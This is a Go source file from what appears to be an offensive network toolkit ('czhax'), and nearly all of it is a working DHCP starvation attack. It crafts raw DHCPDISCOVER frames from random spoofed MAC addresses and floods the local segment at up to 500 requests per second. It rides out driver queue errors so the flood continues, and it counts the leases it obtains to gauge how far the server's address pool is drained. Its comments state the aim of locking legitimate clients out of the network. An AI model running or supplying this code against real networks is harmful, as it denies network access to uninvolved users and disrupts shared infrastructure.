package wifi

import (
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/sys/unix"
)

// DHCPStarvationConfig describes one DHCP starvation run.
//
// The attack sends DHCPDISCOVER packets with a fresh random client MAC for
// every request. Each one is answered with an OFFER, which the server leases
// out until its pool is exhausted and legitimate clients can no longer join.
type DHCPStarvationConfig struct {
	Iface     string `json:"iface"`
	Rate      int    `json:"rate"`  // DISCOVERs per second
	Count     int    `json:"count"` // stop after this many; 0 = until stopped
	RandomMAC bool   `json:"random_mac"`
}

// DHCPStarvationStats is the live tally reported while a run is active.
type DHCPStarvationStats struct {
	Sent      int
	Offers    int
	Unique    int
	LastOffer string
	PoolHint  int // highest host number seen, useful to estimate the pool size
	Dropped   int // frames the driver refused (full queue), retried or skipped
}

const (
	dhcpClientPort = 68
	dhcpServerPort = 67

	dhcpDiscover = 1
	dhcpOffer    = 2
	dhcpRequest  = 3
	dhcpAck      = 5
)

// RandomClientMAC builds a locally administered unicast MAC for a spoofed
// DHCP client.
func RandomClientMAC() net.HardwareAddr {
	var mac [6]byte
	_, _ = rand.Read(mac[:])
	mac[0] = (mac[0] & 0xFC) | 0x02 // locally administered, unicast
	return net.HardwareAddr(mac[:])
}

// BuildDHCPDiscover builds a complete Ethernet/IPv4/UDP DHCPDISCOVER frame for
// a spoofed client MAC. Sending it needs CAP_NET_RAW.
func BuildDHCPDiscover(clientMAC net.HardwareAddr, xid uint32, hostname string) ([]byte, error) {
	if len(clientMAC) != 6 {
		return nil, errors.New("client MAC must be 6 bytes")
	}
	if strings.TrimSpace(hostname) == "" {
		hostname = "czhax"
	}
	if len(hostname) > 32 {
		hostname = hostname[:32]
	}

	// BOOTP payload: 236 fixed bytes, the DHCP magic cookie, then options.
	bootp := make([]byte, 240, 240+64)
	bootp[0] = 1 // BOOTREQUEST
	bootp[1] = 1 // Ethernet
	bootp[2] = 6 // MAC length
	// hops = 0
	binary.BigEndian.PutUint32(bootp[4:8], xid)
	// secs = 0, flags: broadcast bit so servers answer to 255.255.255.255
	binary.BigEndian.PutUint16(bootp[10:12], 0x8000)
	copy(bootp[28:34], clientMAC) // chaddr
	copy(bootp[44:108], []byte(hostname))
	// RFC 2131 magic cookie: without it servers treat this as plain BOOTP and
	// ignore the DHCP options (so no OFFER ever comes back).
	copy(bootp[236:240], []byte{99, 130, 83, 99})

	opts := make([]byte, 0, 64)
	opts = append(opts, 53, 1, dhcpDiscover)     // DHCP message type
	opts = append(opts, 61, 7, 1)                // client identifier: htype + MAC
	opts = append(opts, []byte(clientMAC)...)    //
	opts = append(opts, 12, byte(len(hostname))) // hostname
	opts = append(opts, []byte(hostname)...)     //
	opts = append(opts, 55, 3, 1, 3, 6)          // parameter request list
	opts = append(opts, 57, 2, 0x05, 0xdc)       // max message size 1500
	opts = append(opts, 255)                     // end

	bootp = append(bootp, opts...)

	udpLen := 8 + len(bootp)
	ipLen := 20 + udpLen
	total := 14 + ipLen
	frame := make([]byte, total)

	// Ethernet: broadcast.
	for i := 0; i < 6; i++ {
		frame[i] = 0xff
	}
	copy(frame[6:12], clientMAC)
	binary.BigEndian.PutUint16(frame[12:14], 0x0800)

	// IPv4.
	ip := frame[14:]
	ip[0] = 0x45 // version 4, IHL 5
	ip[1] = 0x00 // DSCP
	binary.BigEndian.PutUint16(ip[2:4], uint16(ipLen))
	binary.BigEndian.PutUint16(ip[4:6], uint16(xid&0xffff))
	binary.BigEndian.PutUint16(ip[6:8], 0x0000) // no fragmentation
	ip[8] = 64                                  // TTL
	ip[9] = 17                                  // UDP
	// src 0.0.0.0, dst 255.255.255.255 are already zero / need the broadcast:
	copy(ip[16:20], []byte{255, 255, 255, 255})
	binary.BigEndian.PutUint16(ip[10:12], ipChecksum(ip[:20]))

	// UDP. The checksum is mandatory in practice: Linux drops DHCP frames that
	// carry a zero (unchecked) UDP checksum, so dnsmasq and friends never see
	// them.
	udp := ip[20:]
	binary.BigEndian.PutUint16(udp[0:2], dhcpClientPort)
	binary.BigEndian.PutUint16(udp[2:4], dhcpServerPort)
	binary.BigEndian.PutUint16(udp[4:6], uint16(udpLen))
	binary.BigEndian.PutUint16(udp[6:8], 0)
	copy(udp[8:], bootp)
	binary.BigEndian.PutUint16(udp[6:8], udpChecksum(ip[12:16], ip[16:20], udp))
	return frame, nil
}

// ipChecksum computes the RFC 1071 header checksum.
func ipChecksum(header []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(header); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(header[i : i+2]))
	}
	if len(header)%2 == 1 {
		sum += uint32(header[len(header)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// udpChecksum computes the UDP checksum over the IPv4 pseudo-header + datagram.
// It sums the bytes explicitly (big-endian pairs, zero-padded tail) so the
// value matches what tcpdump and the kernel expect.
func udpChecksum(srcIP, dstIP, udp []byte) uint16 {
	data := make([]byte, 0, 12+len(udp))
	data = append(data, srcIP...)
	data = append(data, dstIP...)
	data = append(data, 0, 17) // reserved byte + UDP protocol
	data = append(data, byte(len(udp)>>8), byte(len(udp)))
	data = append(data, udp...)
	if len(data)%2 == 1 {
		data = append(data, 0)
	}
	var sum uint32
	for i := 0; i < len(data); i += 2 {
		sum += uint32(data[i])<<8 | uint32(data[i+1])
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	c := ^uint16(sum)
	if c == 0 {
		c = 0xffff
	}
	return c
}

// ParseDHCPReply inspects a raw Ethernet frame and, when it is a DHCP answer
// from a server, returns the offered address, the server identifier and the
// DHCP message type.
func ParseDHCPReply(frame []byte) (offerIP, serverID string, msgType uint8, ok bool) {
	if len(frame) < 14+20+8+244 {
		return "", "", 0, false
	}
	if binary.BigEndian.Uint16(frame[12:14]) != 0x0800 {
		return "", "", 0, false
	}
	ip := frame[14:]
	if ip[0]>>4 != 4 || ip[9] != 17 {
		return "", "", 0, false
	}
	ihl := int(ip[0]&0x0f) * 4
	if ihl < 20 || len(ip) < ihl+8+236 {
		return "", "", 0, false
	}
	udp := ip[ihl:]
	if binary.BigEndian.Uint16(udp[0:2]) != dhcpServerPort || binary.BigEndian.Uint16(udp[2:4]) != dhcpClientPort {
		return "", "", 0, false
	}
	udpLen := int(binary.BigEndian.Uint16(udp[4:6]))
	if udpLen < 8+240 || len(udp) < udpLen {
		return "", "", 0, false
	}
	bootp := udp[8:udpLen]
	if bootp[0] != 2 { // BOOTREPLY
		return "", "", 0, false
	}
	yiaddr := bootp[16:20]
	if yiaddr[0] == 0 && yiaddr[1] == 0 && yiaddr[2] == 0 && yiaddr[3] == 0 {
		return "", "", 0, false
	}
	offerIP = net.IP(yiaddr).String()

	// Walk the options: they start after the DHCP magic cookie.
	if len(bootp) < 240 || bootp[236] != 99 || bootp[237] != 130 || bootp[238] != 83 || bootp[239] != 99 {
		return "", "", 0, false
	}
	opts := bootp[240:]
	for i := 0; i < len(opts); {
		code := opts[i]
		if code == 0 {
			i++
			continue
		}
		if code == 255 {
			break
		}
		if i+1 >= len(opts) {
			break
		}
		l := int(opts[i+1])
		if i+2+l > len(opts) {
			break
		}
		val := opts[i+2 : i+2+l]
		switch code {
		case 53:
			if l >= 1 {
				msgType = val[0]
			}
		case 54:
			if l == 4 {
				serverID = net.IP(val).String()
			}
		}
		i += 2 + l
	}
	if msgType != dhcpOffer && msgType != dhcpAck {
		return "", "", msgType, false
	}
	return offerIP, serverID, msgType, true
}

// DHCPStarvationStatsLine renders the one-line progress the UI shows.
func DHCPStarvationStatsLine(s DHCPStarvationStats) string {
	line := fmt.Sprintf("sent=%d offers=%d unique=%d", s.Sent, s.Offers, s.Unique)
	if s.Dropped > 0 {
		line += fmt.Sprintf(" drops=%d", s.Dropped)
	}
	if s.LastOffer != "" {
		line += " last=" + s.LastOffer
	}
	return line
}

// RunDHCPStarvation floods the local segment with DHCPDISCOVERs until Count is
// reached or ctx is cancelled, reporting progress and the number of distinct
// addresses the DHCP server handed out.
func RunDHCPStarvation(ctx context.Context, cfg DHCPStarvationConfig, onLine func(string)) error {
	emit := func(format string, args ...any) {
		if onLine != nil {
			onLine(fmt.Sprintf(format, args...))
		}
	}
	iface := strings.TrimSpace(cfg.Iface)
	if iface == "" {
		return errors.New("no interface given")
	}
	inf, err := net.InterfaceByName(iface)
	if err != nil {
		return fmt.Errorf("interface %s: %w", iface, err)
	}
	if inf.Flags&net.FlagUp == 0 {
		return fmt.Errorf("%s is down", iface)
	}
	sock, err := openPacketSocket(iface)
	if err != nil {
		return fmt.Errorf("open %s: %w (needs root)", iface, err)
	}
	defer sock.close()
	return runDHCPStarvation(ctx, inf, cfg, sock, emit)
}

// dhcpLink is the frame socket the flood needs; swapping it out keeps the
// pacing/backoff logic testable without root or hardware.
type dhcpLink interface {
	writeWait(frame []byte, timeout time.Duration) error
	read(buf []byte, timeout time.Duration) (int, error)
	close()
}

// runDHCPStarvation floods the segment until Count is reached or ctx is done.
// A full driver queue (EAGAIN/ENOBUFS) slows the run down instead of aborting
// it, which is what happens at high rates on WiFi client interfaces.
func runDHCPStarvation(ctx context.Context, inf *net.Interface, cfg DHCPStarvationConfig, link dhcpLink, emit func(string, ...any)) error {
	iface := inf.Name
	if cfg.Rate <= 0 {
		cfg.Rate = 20
	}
	if cfg.Rate > 500 {
		cfg.Rate = 500
	}
	if cfg.Count < 0 {
		cfg.Count = 0
	}

	// Probe once before declaring the run healthy: drivers can reject raw
	// Ethernet writes outright (EOPNOTSUPP/EPERM), which is worth reporting.
	probe, err := BuildDHCPDiscover(RandomClientMAC(), rand.Uint32(), "czhax")
	if err != nil {
		return err
	}
	if err := link.writeWait(probe, 150*time.Millisecond); err != nil {
		return fmt.Errorf("%s rejects raw frames: %w (use a wired/tethered link or monitor mode)", iface, err)
	}

	var sent int64
	var statsMu sync.Mutex
	stats := DHCPStarvationStats{Sent: 1}
	offers := make(map[string]struct{}, 256)

	// Reader: collect OFFER/ACK replies and count distinct leases.
	go func() {
		buf := make([]byte, 2048)
		for ctx.Err() == nil {
			n, rerr := link.read(buf, 100*time.Millisecond)
			if rerr != nil {
				if ctx.Err() != nil {
					return
				}
				continue
			}
			ip, _, mtype, ok := ParseDHCPReply(buf[:n])
			if !ok || (mtype != dhcpOffer && mtype != dhcpAck) {
				continue
			}
			statsMu.Lock()
			stats.Offers++
			if _, seen := offers[ip]; !seen {
				offers[ip] = struct{}{}
				stats.Unique = len(offers)
			}
			stats.LastOffer = ip
			if parts := strings.Split(ip, "."); len(parts) == 4 {
				if host, perr := strconv.Atoi(parts[3]); perr == nil && host > stats.PoolHint {
					stats.PoolHint = host
				}
			}
			statsMu.Unlock()
		}
	}()

	mode := "continuous"
	if cfg.Count > 0 {
		mode = fmt.Sprintf("%d requests", cfg.Count)
	}
	macLabel := "fixed"
	if cfg.RandomMAC {
		macLabel = "random"
	}
	emit("DHCP starvation on %s (%d req/s, %s, MACs %s)", iface, cfg.Rate, mode, macLabel)
	if len(inf.HardwareAddr) == 6 {
		emit("link MAC %s", inf.HardwareAddr.String())
	}
	if IsWirelessIface(iface) {
		emit("note: %s is a WiFi client; the AP/driver may rewrite or drop spoofed MACs — eth0/usb0 is more reliable", iface)
	}

	interval := time.Second / time.Duration(cfg.Rate)
	if interval < time.Millisecond {
		interval = time.Millisecond
	}
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	report := time.NewTicker(time.Second)
	defer report.Stop()

	hostname := fmt.Sprintf("czhax-%04x", rand.Intn(0xffff))
	fixedMAC := RandomClientMAC()
	start := time.Now()
	noOfferWarned := false

	summarise := func(prefix string, n int64) {
		time.Sleep(500 * time.Millisecond)
		statsMu.Lock()
		final := stats
		final.Sent = int(n)
		statsMu.Unlock()
		emit("%s: %s", prefix, DHCPStarvationStatsLine(final))
		switch {
		case final.Unique > 0 && final.PoolHint > 0:
			emit("pool reach: offered host numbers up to .%d", final.PoolHint)
		case final.Offers == 0 && final.Sent >= 50:
			emit("no offers seen: verify a DHCP server is reachable (an AP may drop spoofed MACs; try a wired link)")
		}
	}

	for {
		select {
		case <-ctx.Done():
			statsMu.Lock()
			final := stats
			final.Sent = int(atomic.LoadInt64(&sent))
			statsMu.Unlock()
			emit("stopped after %s: %s", time.Since(start).Round(time.Second), DHCPStarvationStatsLine(final))
			return ctx.Err()
		case <-report.C:
			statsMu.Lock()
			stats.Sent = int(atomic.LoadInt64(&sent))
			line := DHCPStarvationStatsLine(stats)
			offersSeen := stats.Offers
			statsMu.Unlock()
			emit("%s", line)
			if !noOfferWarned && stats.Sent >= 50 && offersSeen == 0 {
				noOfferWarned = true
				emit("no offers yet: check there is a DHCP server, or the AP may drop spoofed MACs (try a wired link)")
			}
		case <-ticker.C:
			mac := fixedMAC
			if cfg.RandomMAC {
				mac = RandomClientMAC()
			}
			frame, ferr := BuildDHCPDiscover(mac, rand.Uint32(), hostname)
			if ferr != nil {
				return ferr
			}
			if werr := link.writeWait(frame, 40*time.Millisecond); werr != nil {
				// The driver queue is full: count it, give the radio a slot to
				// drain and keep going rather than failing the whole run.
				statsMu.Lock()
				stats.Dropped++
				dropped := stats.Dropped
				statsMu.Unlock()
				if dropped == 1 || dropped%50 == 0 {
					emit("link busy (%v): %d request(s) dropped, throttling", werr, dropped)
				}
				time.Sleep(interval)
				continue
			}
			n := atomic.AddInt64(&sent, 1)
			if cfg.Count > 0 && int(n) >= cfg.Count {
				summarise(fmt.Sprintf("finished %d requests", n), n)
				return nil
			}
		}
	}
}

// write with a bounded wait for the driver queue to drain. EAGAIN/ENOBUFS on a
// busy radio is normal at high rates, so this retries briefly instead of
// failing the run.
func (p *packetSocket) writeWait(frame []byte, timeout time.Duration) error {
	if timeout <= 0 {
		timeout = 25 * time.Millisecond
	}
	deadline := time.Now().Add(timeout)
	for {
		err := p.write(frame)
		if err == nil {
			return nil
		}
		if err != unix.EAGAIN && err != unix.EWOULDBLOCK && err != unix.ENOBUFS && err != unix.EINTR {
			return err
		}
		if time.Now().After(deadline) {
			return err
		}
		pfds := []unix.PollFd{{Fd: int32(p.fd), Events: unix.POLLOUT}}
		_, _ = unix.Poll(pfds, 5)
	}
}

// IsWirelessIface reports whether an interface is backed by a WiFi phy.
func IsWirelessIface(name string) bool {
	if _, err := os.Stat(filepath.Join("/sys/class/net", name, "wireless")); err == nil {
		return true
	}
	if _, err := os.Stat(filepath.Join("/sys/class/net", name, "phy80211")); err == nil {
		return true
	}
	return false
}

// DHCPStarvationUsage is the helper usage string shared with the CLI.
const DHCPStarvationUsage = "usage: czhax local dhcp --iface eth0 [--rate 20] [--count 500] [--random-mac]"

// chownCaptureFile gives a capture back to the invoking user (helper runs as root).
func chownCaptureFile(path string, uid, gid int) {
	if path == "" || (uid < 0 && gid < 0) {
		return
	}
	_ = os.Chown(path, uid, gid)
}
